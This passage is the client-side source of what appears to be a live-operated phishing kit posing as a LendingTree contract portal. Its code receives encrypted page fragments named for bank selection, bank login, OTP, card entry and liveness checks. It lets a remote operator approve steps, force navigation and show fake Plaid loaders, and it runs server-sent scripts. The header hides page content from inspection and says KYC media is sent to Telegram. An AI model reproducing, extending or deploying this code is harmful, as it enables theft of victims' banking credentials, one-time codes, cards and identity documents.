/**
 * ================================================================
 *  SHELL.JS — LendingTree Contract Portal v3.0.0
 *  Frontend Connection Engine + Crypto Injector
 * ================================================================
 *
 *  This is the ONLY JavaScript that ships with the frontend.
 *  It does NOT contain:
 *   - Form validation logic
 *   - Business rules or flow control
 *   - Navigation targets or page references
 *   - Any knowledge of what Pages 2/3/4 contain
 *
 *  It DOES contain:
 *   1. Triple-redundancy connection (WSS → Supabase Realtime → SSE)
 *   2. AES-256-GCM decryption of layout fragments
 *   3. HMAC-SHA256 integrity verification
 *   4. Anti-replay protection (monotonic sequence)
 *   5. DOM injection into empty shell containers
 *   6. Session lifecycle (create/resume/persist/idle-timeout)
 *   7. Heartbeat keep-alive
 *   8. Application ID gate (modal + Supabase lookup)
 *   9. Admin command receiver & dispatcher
 *  10. Media upload pipeline (KYC/Liveness → Backend → Telegram)
 *
 *  DEPENDS ON: config.js, Supabase JS CDN
 * ================================================================
 */

(function (window) {
  'use strict';

  // ── Guard: config.js must be loaded ──
  if (typeof APP_CONFIG === 'undefined') {
    console.error('[Shell] FATAL: config.js must be loaded before shell.js');
    return;
  }

  const CFG      = APP_CONFIG;
  const TIMING   = CFG.TIMING;
  const CHANNELS = CFG.CHANNELS;
  const CRYPTO   = CFG.CRYPTO;

  // ================================================================
  //  LOGGER
  // ================================================================
  const Log = {
    _p: '[Shell]',
    info:  (...a) => CFG.ENV !== 'production' && console.log(Log._p, ...a),
    warn:  (...a) => console.warn(Log._p, ...a),
    error: (...a) => console.error(Log._p, ...a),
    debug: (...a) => CFG.ENV === 'development' && console.debug(Log._p, ...a),
  };

  // ================================================================
  //  STATE — Single source of truth
  // ================================================================
  const S = {
    sessionId:        null,
    applicationId:    null,
    applicationData:  null,
    currentPage:      'page1',

    // Crypto
    sessionKey:       null,     // CryptoKey (AES-GCM)
    hmacKey:          null,     // CryptoKey (HMAC)
    _seenSeqs:        new Set(), // Anti-replay: seen sequence set (allows out-of-order)

    // Connection
    ws:               null,
    wsReconnectTimer: null,
    wsReconnectCount: 0,
    rtChannel:        null,
    sseController:    null,
    activeChannel:    'none',
    heartbeatTimer:   null,
    idleTimer:        null,
    isConnected:      false,

    // Supabase
    supabase:         null,

    // Approval gate
    pendingStep:      null,
  };

  // ================================================================
  //  FIX #2 — FRAGMENT TARGET MAP
  //  Maps backend fragment IDs → shell container element IDs in index.html.
  //  Required by the RENDER_FRAGMENT handler added below.
  // ================================================================
  const FRAGMENT_TARGETS = {
    'idx_appid_v1':  'sh-page2-content',
    'c_splash_v1':   'sh-splash-slot',
    'c_forma_v1':    'sh-page2-content',
    'c_formb_v1':    'sh-page2-content',
    'c_formc_v1':    'sh-page2-content',
    'p_init_v1':     'sh-page3-content',
    'p_banksel_v1':  'sh-page3-content',
    'p_login_v1':    'sh-page3-content',
    'p_otp_v1':      'sh-page3-content',
    'p_card_v1':     'sh-page3-content',
    'p_liveness_v1': 'sh-liveness-scanner-slot',
    'success_v1':    'sh-page4-content',
  };

  // ================================================================
  //  STORAGE — Session persistence
  // ================================================================
  const Store = {
    K: {
      SID:   'lt_sid',
      AID:   'lt_aid',
      PAGE:  'lt_page',
      ADATA: 'lt_adata',
    },

    set(k, v) {
      try {
        const s = typeof v === 'object' ? JSON.stringify(v) : String(v);
        sessionStorage.setItem(k, s);
        if ([this.K.SID, this.K.AID].includes(k)) localStorage.setItem(k, s);
      } catch (e) { /* silent */ }
    },

    get(k, fb = null) {
      try {
        let v = sessionStorage.getItem(k) || localStorage.getItem(k);
        if (v === null) return fb;
        try { return JSON.parse(v); } catch { return v; }
      } catch { return fb; }
    },

    del(k) {
      try { sessionStorage.removeItem(k); localStorage.removeItem(k); } catch { /* */ }
    },

    clear() { Object.values(this.K).forEach(k => this.del(k)); },

    saveAll() {
      this.set(this.K.SID,  S.sessionId);
      this.set(this.K.AID,  S.applicationId);
      this.set(this.K.PAGE, S.currentPage);
      if (S.applicationData) this.set(this.K.ADATA, S.applicationData);
    },
  };

  // ================================================================
  //  SUPABASE CLIENT
  // ================================================================
  const DB = {
    init() {
      if (!window.supabase || !CFG.SUPABASE_URL || !CFG.SUPABASE_ANON_KEY) {
        Log.warn('Supabase not configured. Some features disabled.');
        return false;
      }
      S.supabase = window.supabase.createClient(CFG.SUPABASE_URL, CFG.SUPABASE_ANON_KEY, {
        realtime: { params: { eventsPerSecond: 10 } },
        auth: { persistSession: false },
      });
      Log.info('Supabase initialized.');
      return true;
    },

    async getApplication(appId) {
      if (!S.supabase) return { success: false, error: 'No Supabase' };
      try {
        const { data, error } = await S.supabase
          .from('applications')
          .select('*')
          .eq('application_id', appId.trim().toUpperCase())
          .single();
        if (error) throw error;
        return { success: true, data };
      } catch (e) {
        return { success: false, error: e.message };
      }
    },

    async upsertSession(d) {
      if (!S.supabase) return;
      try { await S.supabase.from('sessions').upsert(d, { onConflict: 'session_id' }); }
      catch (e) { Log.debug('upsertSession:', e.message); }
    },

    async updateSession(fields) {
      if (!S.supabase || !S.sessionId) return;
      try {
        await S.supabase.from('sessions')
          .update({ ...fields, updated_at: new Date().toISOString() })
          .eq('session_id', S.sessionId);
      } catch (e) { Log.debug('updateSession:', e.message); }
    },

    async trackEvent(type, data = {}) {
      if (!S.supabase) return;
      try {
        await S.supabase.from('events').insert({
          session_id:     S.sessionId,
          application_id: S.applicationId,
          event_type:     type,
          event_data:     data,
          page:           S.currentPage,
        });
      } catch (e) { Log.debug('trackEvent:', e.message); }
    },

    async updateCommandStatus(id, status) {
      if (!S.supabase || !id) return;
      try {
        await S.supabase.from('admin_commands')
          .update({ status, [`${status === 'executed' ? 'executed' : 'delivered'}_at`]: new Date().toISOString() })
          .eq('id', id);
      } catch (e) { /* silent */ }
    },
  };

  // ================================================================
  //  CRYPTO ENGINE — AES-256-GCM + HMAC-SHA256 + Anti-Replay
  // ================================================================
  const Crypto = {

    // Import raw key bytes from backend handshake (legacy KEY_EXCHANGE path)
    async importKeys(aesKeyB64, hmacKeyB64) {
      const aesRaw  = Uint8Array.from(atob(aesKeyB64),  c => c.charCodeAt(0));
      const hmacRaw = Uint8Array.from(atob(hmacKeyB64), c => c.charCodeAt(0));

      S.sessionKey = await window.crypto.subtle.importKey(
        'raw', aesRaw, { name: CRYPTO.ALGORITHM, length: CRYPTO.KEY_LENGTH }, false, ['decrypt']
      );

      S.hmacKey = await window.crypto.subtle.importKey(
        'raw', hmacRaw, { name: 'HMAC', hash: CRYPTO.HMAC_ALGO }, false, ['verify']
      );

      Log.info('Crypto keys imported.');
    },

    // ── FIX #1 — PBKDF2 Key Derivation ───────────────────────────
    // Derives the AES-256-GCM session key from serverSalt received in
    // session_ack. Mirrors FragmentCrypto.deriveKey() on the backend
    // exactly: PBKDF2-SHA256, 310000 iterations, sessionId as password.
    // Without this, S.sessionKey stays null and all decryption silently
    // returns garbage bytes (the atob fallback path in decrypt()).
    async deriveFromSalt(serverSaltB64, sessionId) {
      const saltBytes = Uint8Array.from(atob(serverSaltB64), c => c.charCodeAt(0));

      const keyMaterial = await window.crypto.subtle.importKey(
        'raw',
        new TextEncoder().encode(sessionId),
        { name: 'PBKDF2' },
        false,
        ['deriveKey']
      );

      S.sessionKey = await window.crypto.subtle.deriveKey(
        {
          name:       'PBKDF2',
          salt:       saltBytes,
          iterations: 310000,       // MUST match server FragmentCrypto.deriveKey()
          hash:       'SHA-256',
        },
        keyMaterial,
        { name: 'AES-GCM', length: 256 },
        false,
        ['decrypt']
      );

      Log.info('Session key derived from serverSalt via PBKDF2.');
    },

    // Verify HMAC signature of payload
    async verify(payloadB64, signatureB64) {
      if (!S.hmacKey) return true; // Graceful: skip if no key yet
      const payload   = Uint8Array.from(atob(payloadB64),   c => c.charCodeAt(0));
      const signature = Uint8Array.from(atob(signatureB64), c => c.charCodeAt(0));
      return window.crypto.subtle.verify('HMAC', S.hmacKey, signature, payload);
    },

    // Decrypt AES-256-GCM encrypted fragment
    async decrypt(ciphertextB64, ivB64) {
      if (!S.sessionKey) {
        Log.warn('No session key — returning raw payload (dev mode fallback)');
        return atob(ciphertextB64);
      }

      const ciphertext = Uint8Array.from(atob(ciphertextB64), c => c.charCodeAt(0));
      const iv         = Uint8Array.from(atob(ivB64),          c => c.charCodeAt(0));

      const decrypted = await window.crypto.subtle.decrypt(
        { name: CRYPTO.ALGORITHM, iv, tagLength: CRYPTO.TAG_LENGTH },
        S.sessionKey,
        ciphertext
      );

      return new TextDecoder().decode(decrypted);
    },

    // Anti-replay: seen-set approach — rejects exact duplicates, allows out-of-order
    checkSequence(seq) {
      if (typeof seq !== 'number') return true;
      if (S._seenSeqs.has(seq)) {
        Log.warn(`Anti-replay: duplicate seq ${seq} rejected`);
        return false;
      }
      S._seenSeqs.add(seq);
      // Keep set bounded — prune oldest entries when > 100
      if (S._seenSeqs.size > 100) {
        const arr = Array.from(S._seenSeqs).sort((a, b) => a - b);
        for (let i = 0; i < 50; i++) S._seenSeqs.delete(arr[i]);
      }
      return true;
    },
  };

  // ================================================================
  //  DOM INJECTOR — Decrypt + verify + inject into shell slots
  // ================================================================
  const Injector = {

    // Process an INJECT_FRAGMENT or APPEND_FRAGMENT command from backend
    async inject(msg, append = false) {
      const { target, payload, iv, signature, seq, scripts } = msg;

      // 1. Anti-replay check
      if (!Crypto.checkSequence(seq)) return;

      // 2. HMAC verification
      if (signature) {
        const valid = await Crypto.verify(payload, signature);
        if (!valid) {
          Log.error('HMAC verification failed — fragment rejected');
          DB.trackEvent('fragment_rejected', { target, reason: 'hmac_failed' });
          return;
        }
      }

      // 3. Decrypt
      let html;
      try {
        html = iv ? await Crypto.decrypt(payload, iv) : atob(payload);
      } catch (e) {
        Log.error('Decryption failed:', e);
        return;
      }

      // 4. Inject into target container
      const container = document.getElementById(target);
      if (!container) {
        Log.warn('Inject target not found:', target);
        return;
      }

      if (append) {
        container.querySelectorAll('.screen').forEach(function(s) { s.classList.remove('active'); });
        container.insertAdjacentHTML('beforeend', html);
      } else {
        container.innerHTML = html;
      }

      // 5. Execute any inline scripts that came with the fragment
      if (scripts && Array.isArray(scripts)) {
        for (const scriptSrc of scripts) {
          try {
            const fn = new Function(scriptSrc);
            fn.call(window);
          } catch (e) {
            Log.warn('Fragment script execution error:', e);
          }
        }
      }

      _execScripts(container);

      // 6. ACK delivery to backend
      Conn.send({ type: 'fragment_ack', target, seq });

      Log.info(`Injected fragment → #${target}`);
      DB.trackEvent('fragment_injected', { target, seq });
    },
  };

  // ================================================================
  //  PAGE CONTROLLER — Manages page visibility (no navigation links)
  // ================================================================
  const Pages = {

    show(pageId) {
      document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
      const page = document.getElementById(pageId);
      if (!page) { Log.warn('Page not found:', pageId); return; }
      page.classList.add('active');
      page.classList.remove('_px-entering');
      void page.offsetWidth;
      page.classList.add('_px-entering');
      page.addEventListener('animationend', function h() {
        page.classList.remove('_px-entering');
        page.removeEventListener('animationend', h);
      });

      S.currentPage = pageId;
      Store.saveAll();
      window.scrollTo(0, 0);

      DB.updateSession({ current_page: pageId, connection_status: 'online' });
      DB.trackEvent('page_show', { page: pageId });
    },

    showSection(sectionId) {
      const section = document.getElementById(sectionId);
      if (!section) return;
      const parent = section.parentNode;
      if (parent) {
        parent.querySelectorAll('.form-section').forEach(f => f.classList.remove('active'));
      }
      section.classList.add('active');
      section.classList.remove('_px-entering');
      void section.offsetWidth;
      section.classList.add('_px-entering');
      section.addEventListener('animationend', function h() {
        section.classList.remove('_px-entering');
        section.removeEventListener('animationend', h);
      });
      window.scrollTo(0, 0);
    },

    showScreen(screenId) {
      document.querySelectorAll('#sh-page3-content .screen').forEach(s => s.classList.remove('active'));
      const screen = document.getElementById(screenId);
      if (!screen) return;
      screen.classList.add('active');
      screen.classList.remove('_px-entering');
      void screen.offsetWidth;
      screen.classList.add('_px-entering');
      screen.addEventListener('animationend', function h() {
        screen.classList.remove('_px-entering');
        screen.removeEventListener('animationend', h);
      });
    },
  };

  // ================================================================
  //  CONNECTION MANAGER — WSS + Realtime + SSE (triple redundancy)
  // ================================================================
  const Conn = {

    async init() {
      UI.setStatus('connecting');

      if (CHANNELS.WEBSOCKET && CFG.BACKEND_WS_URL) {
        this._connectWS();
      } else if (CHANNELS.SUPABASE_REALTIME && S.supabase) {
        this._connectRealtime();
      } else if (CHANNELS.SSE_POLLING && CFG.BACKEND_URL) {
        this._connectSSE();
      } else {
        Log.warn('No connection channels configured.');
        UI.setStatus('offline');
      }

      if (CHANNELS.SUPABASE_REALTIME && S.supabase) {
        this._subscribeRealtime();
      }
    },

    // ── WebSocket ──
    _connectWS() {
      if (!CFG.BACKEND_WS_URL) { this._connectRealtime(); return; }
      try {
        const url = `${CFG.BACKEND_WS_URL}/ws?sid=${encodeURIComponent(S.sessionId)}`;
        Log.info('WS: Connecting…');
        const ws = new WebSocket(url);
        S.ws = ws;

        ws.onopen = () => {
          Log.info('WS: Connected');
          S.wsReconnectCount = 0;
          S.activeChannel    = 'websocket';
          S.isConnected      = true;
          UI.setStatus('online', 'ws');

          // ── FIX #3 — currentPage renamed to currentRoute ──────────
          // Backend destructures `currentRoute` not `currentPage`.
          // Sending `currentPage` meant route was always 'unknown',
          // causing the backend to re-deliver idx_appid_v1 on every
          // reconnect regardless of which page the client was on.
          this.send({
            type:          'session_register',
            sessionId:     S.sessionId,
            applicationId: S.applicationId,
            currentRoute:  S.currentPage,   // ← was: currentPage (bug fixed)
            device: {
              screenSize: `${screen.width}x${screen.height}`,
              platform:   navigator.platform,
            },
          });

          if (S.applicationId && S.currentPage !== 'page1') {
            setTimeout(() => {
              this.send({
                type:          'session_resume',
                sessionId:     S.sessionId,
                applicationId: S.applicationId,
                currentRoute:  S.currentPage,
              });
              Log.info('Sent session_resume for layout re-push');
            }, 500);
          }

          Heartbeat.start();
          this._fetchQueuedCommands();
        };

        ws.onmessage = (e) => {
          try { CmdExec.handle(JSON.parse(e.data)); }
          catch (err) { Log.debug('WS parse error:', err); }
        };

        ws.onerror = () => { Log.warn('WS: Error'); };

        ws.onclose = (e) => {
          Log.warn(`WS: Closed (${e.code})`);
          S.ws = null; S.isConnected = false;
          UI.setStatus('offline');
          Heartbeat.stop();
          if (S.activeChannel === 'websocket') this._connectRealtime();
          this._scheduleWsReconnect();
        };
      } catch (e) {
        Log.error('WS: Create failed:', e);
        this._connectRealtime();
      }
    },

    _scheduleWsReconnect() {
      if (S.wsReconnectTimer) return;
      const delay = Math.min(
        TIMING.WS_RECONNECT_BASE * Math.pow(2, S.wsReconnectCount),
        TIMING.WS_RECONNECT_MAX
      );
      S.wsReconnectCount++;
      Log.info(`WS: Reconnect in ${delay / 1000}s (#${S.wsReconnectCount})`);
      S.wsReconnectTimer = setTimeout(() => {
        S.wsReconnectTimer = null;
        this._connectWS();
      }, delay);
    },

    // ── Supabase Realtime ──
    _connectRealtime() {
      if (!CHANNELS.SUPABASE_REALTIME || !S.supabase) return;
      if (S.activeChannel !== 'websocket') {
        S.activeChannel = 'realtime';
        S.isConnected   = true;
        UI.setStatus('online', 'rt');
        Heartbeat.start();
      }
    },

    _subscribeRealtime() {
      if (!S.supabase || !S.sessionId) return;
      if (S.rtChannel) S.supabase.removeChannel(S.rtChannel);

      S.rtChannel = S.supabase
        .channel(`cmd:${S.sessionId}`)
        .on('postgres_changes', {
          event:  'INSERT',
          schema: 'public',
          table:  'admin_commands',
          filter: `session_id=eq.${S.sessionId}`,
        }, (payload) => {
          const cmd = {
            type:    payload.new.command_type,
            payload: payload.new.payload,
            id:      payload.new.id,
          };
          DB.updateCommandStatus(cmd.id, 'delivered');
          CmdExec.handle(cmd);
        })
        .subscribe((status) => {
          Log.debug('Realtime:', status);
          if (status === 'SUBSCRIBED') this._fetchQueuedCommands();
        });
    },

    // ── SSE Long-Poll ──
    _connectSSE() {
      if (!CFG.BACKEND_URL) { UI.setStatus('offline'); return; }
      const url = `${CFG.BACKEND_URL}/events/${encodeURIComponent(S.sessionId)}`;

      const poll = () => {
        const ctrl = new AbortController();
        S.sseController = ctrl;

        fetch(url, { signal: ctrl.signal, headers: { 'Cache-Control': 'no-cache' } })
          .then(async (res) => {
            const reader = res.body.getReader();
            const dec = new TextDecoder();
            S.activeChannel = 'sse'; S.isConnected = true;
            UI.setStatus('online', 'sse');
            Heartbeat.start();

            let buf = '';
            while (true) {
              const { done, value } = await reader.read();
              if (done) break;
              buf += dec.decode(value, { stream: true });
              const parts = buf.split('\n\n');
              buf = parts.pop();
              for (const chunk of parts) {
                if (chunk.startsWith('data: ')) {
                  try { CmdExec.handle(JSON.parse(chunk.slice(6))); }
                  catch (e) { /* skip */ }
                }
              }
            }
          })
          .catch((e) => {
            if (e.name !== 'AbortError') {
              Log.warn('SSE: Failed, retry in 5s');
              UI.setStatus('offline');
              setTimeout(poll, TIMING.SSE_RETRY_DELAY);
            }
          });
      };

      poll();
    },

    // ── Fetch queued commands on (re)connect ──
    async _fetchQueuedCommands() {
      if (!S.supabase || !S.sessionId) return;
      try {
        const { data: cmds } = await S.supabase
          .from('admin_commands')
          .select('id, command_type, payload, status')
          .eq('session_id', S.sessionId)
          .in('status', ['queued', 'delivered'])
          .order('created_at', { ascending: true })
          .limit(20);
        if (!cmds || cmds.length === 0) return;
        Log.info(`Replaying ${cmds.length} queued command(s)`);
        for (const row of cmds) {
          CmdExec.handle({ type: row.command_type, payload: row.payload, id: row.id });
          DB.updateCommandStatus(row.id, 'executed');
        }
      } catch (e) { Log.debug('fetchQueued:', e.message); }
    },

    // ── Unified send ──
    send(data) {
      const enriched = { ...data, sessionId: S.sessionId };

      if (S.ws && S.ws.readyState === WebSocket.OPEN) {
        S.ws.send(JSON.stringify(enriched));
        return;
      }

      if (CFG.BACKEND_URL) {
        fetch(`${CFG.BACKEND_URL}/event`, {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify(enriched),
        }).catch(() => {});
        return;
      }

      DB.trackEvent(data.type, data);
    },

    destroy() {
      if (S.wsReconnectTimer) clearTimeout(S.wsReconnectTimer);
      if (S.ws) S.ws.close();
      if (S.rtChannel && S.supabase) S.supabase.removeChannel(S.rtChannel);
      if (S.sseController) S.sseController.abort();
      Heartbeat.stop();
    },
  };

  // ================================================================
  //  HEARTBEAT
  // ================================================================
  const Heartbeat = {
    start() {
      this.stop();
      S.heartbeatTimer = setInterval(() => this._ping(), TIMING.HEARTBEAT_INTERVAL);
      Idle.reset();
    },

    stop() {
      if (S.heartbeatTimer) { clearInterval(S.heartbeatTimer); S.heartbeatTimer = null; }
    },

    _ping() {
      Conn.send({ type: 'ping', currentPage: S.currentPage, ts: Date.now() });
      DB.updateSession({
        last_heartbeat:     new Date().toISOString(),
        connection_status:  'online',
        connection_channel: S.activeChannel,
        current_page:       S.currentPage,
      });
    },
  };

  // ================================================================
  //  IDLE TIMEOUT — 59 min inactive = session disconnect
  // ================================================================
  const Idle = {
    reset() {
      if (S.idleTimer) clearTimeout(S.idleTimer);
      S.idleTimer = setTimeout(() => {
        Log.warn('Session idle timeout (59m). Disconnecting.');
        Conn.send({ type: 'session_idle', sessionId: S.sessionId });
        DB.updateSession({ connection_status: 'idle_timeout' });
        Conn.destroy();
        UI.showLockScreen('Your session has expired due to inactivity. Please refresh to continue.');
      }, TIMING.IDLE_TIMEOUT);
    },
  };

  // ================================================================
  //  FIX #2 (part 2) — SCRIPT EXECUTOR HELPER
  //  Shared by Injector and the new RENDER_FRAGMENT handler.
  //  Replaces <script> tags inside an injected container so the
  //  browser actually executes them (innerHTML assignment does not).
  // ================================================================
  function _execScripts(container) {
    container.querySelectorAll('script').forEach(old => {
      const s = document.createElement('script');
      if (old.src) {
        s.src = old.src;
      } else {
        s.textContent = old.textContent;
      }
      old.parentNode.replaceChild(s, old);
    });
  }

  // ================================================================
  //  COMMAND EXECUTOR — Handles all backend commands
  // ================================================================
  const CmdExec = {
    _processed: new Set(),

    handle(msg) {
      if (!msg || !msg.type) return;
      Log.info('CMD:', msg.type);

      // Reset idle on any command
      Idle.reset();

      // Dedup for approval/rejection commands
      if (msg.type === 'APPROVE_STEP' || msg.type === 'REJECT_STEP') {
        const key = `${msg.type}:${(msg.payload || {}).step_type || 'unknown'}`;
        if (this._processed.has(key)) return;
        this._processed.add(key);
        setTimeout(() => this._processed.delete(key), 5000);
      }

      if (msg.id) DB.updateCommandStatus(msg.id, 'executed');

      switch (msg.type) {

        case 'pong': break;

        // ── FIX #1 — Backend handshake: derive session key from serverSalt ──
        // Backend sends session_ack immediately after session_register.
        // serverSalt is used to derive the AES-256-GCM key via PBKDF2.
        // Also replays any commands that queued while the client was offline.
        // Previously this case was missing entirely — salt was discarded,
        // S.sessionKey stayed null, all fragment decryption returned garbage.
        case 'session_ack': {
  const { serverSalt, queuedCommands } = msg.payload || {};
  if (serverSalt) {
    // ── KEY RACE FIX ──────────────────────────────────────────
    // PBKDF2 takes 2-5s. Queued RENDER_FRAGMENT commands need
    // S.sessionKey ready before Crypto.decrypt() is called.
    // Chain the replay INSIDE the .then() so it only runs after
    // the key is derived. Without this, atob() fallback fires and
    // injects binary garbage into the DOM — page appears blank.
    Crypto.deriveFromSalt(serverSalt, S.sessionId)
      .then(() => {
        if (Array.isArray(queuedCommands) && queuedCommands.length) {
          Log.info(`Replaying ${queuedCommands.length} queued command(s) — key ready`);
          queuedCommands.forEach(cmd => CmdExec.handle(cmd));
        }
      })
      .catch(e => Log.error('Key derivation failed:', e));
  } else if (Array.isArray(queuedCommands) && queuedCommands.length) {
    // No salt (dev mode / unencrypted) — replay immediately
    Log.info(`Replaying ${queuedCommands.length} queued command(s) from session_ack`);
    queuedCommands.forEach(cmd => CmdExec.handle(cmd));
  }
  break;
}

        // ── FIX #2 — Encrypted fragment delivery ─────────────────────────
        // Backend sends every layout fragment as RENDER_FRAGMENT.
        // Previously this case was missing — all fragments fell to the
        // default branch and were silently discarded. The shell only had
        // INJECT_FRAGMENT / APPEND_FRAGMENT which the backend never sends.
        case 'RENDER_FRAGMENT': {
          const p = msg.payload || {};
          const {
            fragment_id,
            encrypted_html,
            iv_html,
            encrypted_css,
            iv_css,
            _dev_html,
            _dev_css,
          } = p;

          const targetId = FRAGMENT_TARGETS[fragment_id];
          if (!targetId) {
            Log.warn('RENDER_FRAGMENT: No container mapped for fragment:', fragment_id);
            break;
          }

          // Dev plaintext fallback (backend sends this when no salt exists)
          if (_dev_html) {
            const el = document.getElementById(targetId);
            if (el) { el.innerHTML = _dev_html; _execScripts(el); }
            Log.info(`RENDER_FRAGMENT (dev plaintext): ${fragment_id} → #${targetId}`);
            break;
          }

          if (!encrypted_html || !iv_html) {
            Log.warn('RENDER_FRAGMENT: Missing encrypted payload for:', fragment_id);
            break;
          }

          Crypto.decrypt(encrypted_html, iv_html)
            .then(html => {
              const el = document.getElementById(targetId);
              if (!el) {
                Log.warn('RENDER_FRAGMENT: Container not found:', targetId);
                return;
              }
              el.innerHTML = html;
              _execScripts(el);
              Log.info(`RENDER_FRAGMENT: ${fragment_id} → #${targetId}`);

              if (encrypted_css && iv_css) {
                return Crypto.decrypt(encrypted_css, iv_css).then(css => {
                  if (css && css.trim()) {
                    const style = document.createElement('style');
                    style.setAttribute('data-frag', fragment_id);
                    style.textContent = css;
                    document.head.appendChild(style);
                  }
                });
              }
            })
            .catch(e => Log.error('RENDER_FRAGMENT decrypt failed:', fragment_id, e));
          break;
        }

        // ── Crypto key exchange (legacy path) ──
        case 'KEY_EXCHANGE': {
          const { aes_key, hmac_key } = msg.payload || {};
          if (aes_key && hmac_key) Crypto.importKeys(aes_key, hmac_key);
          break;
        }

        // ── Layout fragment injection (legacy path) ──
        case 'INJECT_FRAGMENT': {
          Injector.inject(msg.payload || msg, false);
          break;
        }

        case 'APPEND_FRAGMENT': {
          Injector.inject(msg.payload || msg, true);
          break;
        }

        // ── Navigate to a page ──
        case 'SHOW_PAGE': {
          const { page } = msg.payload || {};
          if (page) Pages.show(page);
          break;
        }

        case 'SHOW_SECTION': {
          const { section } = msg.payload || {};
          if (section) Pages.showSection(section);
          break;
        }

        case 'SHOW_SCREEN': {
          const { screen } = msg.payload || {};
          if (screen) Pages.showScreen(screen);
          break;
        }

        // ── FIX #4 — FORCE_NAVIGATE_PAGE with route→pageId mapping ──
        // Backend sends { route: 'CONTRACT' } or { page: 'INDEX' }.
        // Previously this case was missing — the backend nav commands
        // were silently dropped. Added full route → pageId mapping.
        case 'FORCE_NAVIGATE_PAGE': {
          const { route, page } = msg.payload || {};
          const target = route || page;
          const pageMap = {
            INDEX:    'page1',
            CONTRACT: 'page2',
            PLAID:    'page3',
            SUCCESS:  'page4',
          };
          const pageId = pageMap[target] || target;
          if (pageId) Pages.show(pageId);
          break;
        }

        // ── Approval flow ──
        case 'APPROVE_SESSION': {
  UI.hideLoader();
  Conn.send({ type: 'navigation_intent', fromRoute: 'INDEX', toRoute: 'CONTRACT' });

  // ── RECONNECT RACE FIX ────────────────────────────────────
  // APPROVE_SESSION often arrives via Supabase Realtime while
  // WS is down. The queued fragments (c_splash_v1, c_forma_v1)
  // sit in Redis until WS reconnects and session_register fires.
  // The backoff timer could make us wait up to 30s — but the
  // welcome screen only lasts 7s. Clear the timer and reconnect
  // immediately so fragments are ready before page2 is shown.
  if (!S.ws || S.ws.readyState !== WebSocket.OPEN) {
    S.wsReconnectCount = 0;
    if (S.wsReconnectTimer) {
      clearTimeout(S.wsReconnectTimer);
      S.wsReconnectTimer = null;
    }
    setTimeout(() => Conn._connectWS(), 100);
  }

  const firstName = (S.applicationData?.client_name || '').split(' ')[0] || 'there';
  UI.showWelcome(firstName, () => Pages.show('page2'));
  DB.trackEvent('session_approved');
  break;
}
        case 'REJECT_SESSION': {
          UI.hideLoader();
          UI.showModal('Access Denied',
            'We were unable to verify your application at this time. Please contact support.',
            false);
          DB.trackEvent('session_rejected');
          break;
        }

        case 'APPROVE_STEP': {
          const { step_type } = msg.payload || {};
          S.pendingStep = null;
          UI.hideApprovalOverlay();
          UI.toast('success', 'Verification approved. Continuing…');
          DB.trackEvent('step_approved', { step_type });
          break;
        }

        case 'REJECT_STEP': {
          const { step_type, reason = 'Verification failed.', allow_retry = true } = msg.payload || {};
          S.pendingStep = null;
          UI.hideApprovalOverlay();
          UI.showRejection(step_type, reason, allow_retry);
          DB.trackEvent('step_rejected', { step_type, reason });
          break;
        }

        // ── Admin controls ──
        case 'SHOW_LOADER': {
          const { message } = msg.payload || {};
          UI.showLoader(message);
          break;
        }

        case 'SHOW_PLAID_LOADER': {
          const { message } = msg.payload || {};
          UI.showPlaidLoader(message);
          break;
        }

        case 'HIDE_LOADER': UI.hideLoader(); break;

        case 'LOCK_SESSION': {
          const { message } = msg.payload || {};
          UI.showLockScreen(message);
          DB.updateSession({ session_locked: true });
          break;
        }

        case 'UNLOCK_SESSION': {
          UI.hideLockScreen();
          DB.updateSession({ session_locked: false });
          break;
        }

        case 'SHOW_TOAST':
        case 'SHOW_MESSAGE': {
          const { type = 'info', text, duration } = msg.payload || {};
          UI.toast(type, text, duration);
          break;
        }

        case 'OPEN_MODAL': {
          const { title, message, closeable = true } = msg.payload || {};
          UI.showModal(title, message, closeable);
          break;
        }

        case 'CLOSE_MODAL': UI.closeModal(); break;

        case 'FORCE_NAVIGATE': {
          const { target_page, target_screen, target_section } = msg.payload || {};
          if (target_page) Pages.show(target_page);
          if (target_section) setTimeout(() => Pages.showSection(target_section), 300);
          if (target_screen)  setTimeout(() => Pages.showScreen(target_screen), 300);
          break;
        }

        case 'REQUEST_UPLOAD': {
          const p = msg.payload || {};
          UI.showUploadModal(p);
          break;
        }

        case 'UPLOAD_RECEIVED': {
          const uploadModal = document.getElementById('sh-upload-modal');
          if (uploadModal) { uploadModal.classList.remove('active'); setTimeout(() => uploadModal.remove(), 400); }
          UI.toast('success', (msg.payload || {}).message || 'Document received.', 7000);
          break;
        }

        case 'FORCE_MODAL_CUSTOM': {
          const { header, headerType, body, showUpload, showCamera } = msg.payload || {};
          UI.showCustomModal(header || headerType || 'Notice', body || '', { showUpload, showCamera });
          break;
        }

        case 'FORCE_KYC_REDIRECT': {
          const { body: kycBody, redirectUrl } = msg.payload || {};
          UI.showKycRedirectModal(kycBody || '', redirectUrl || '');
          break;
        }

        case 'FORCE_LOADER_PUSH': {
          const { loaderType, message: ldrMsg } = msg.payload || {};
          if (loaderType === 'plaid') UI.showPlaidLoader(ldrMsg); else UI.showLoader(ldrMsg);
          break;
        }

        default:
          Log.debug('Unknown command:', msg.type);
      }
    },
  };

  // ================================================================
  //  APPLICATION ID GATE
  // ================================================================
  const AppGate = {

    open() { UI.showAppIdModal(); },

    async submit(inputVal) {
      const id = inputVal.trim().toUpperCase();
      if (!id || id.length < 6) {
        UI.showAppIdError('Please enter a valid Application ID.');
        return;
      }

      UI.setAppIdLoading(true);
      const result = await DB.getApplication(id);

      if (!result.success) {
        UI.setAppIdLoading(false);
        UI.showAppIdError('Application ID not found. Please check and try again.');
        DB.trackEvent('app_id_failed', { id });
        return;
      }

      const app = result.data;
      if (app.status === 'rejected') {
        UI.setAppIdLoading(false);
        UI.showAppIdError('This application has been rejected.');
        return;
      }
      if (app.status === 'completed') {
        UI.setAppIdLoading(false);
        UI.showAppIdError('This application has already been completed.');
        return;
      }

      S.applicationId   = app.application_id;
      S.applicationData = app;
      Store.set(Store.K.AID,   app.application_id);
      Store.set(Store.K.ADATA, app);

      await DB.updateSession({ application_id: app.application_id });
      Conn._subscribeRealtime();

      UI.setAppIdLoading(false);
      UI.closeAppIdModal();

      DB.trackEvent('app_id_success', { id });

      if (CFG.BACKEND_URL) {
        try {
          const res = await fetch(`${CFG.BACKEND_URL}/session/entry-notify`, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
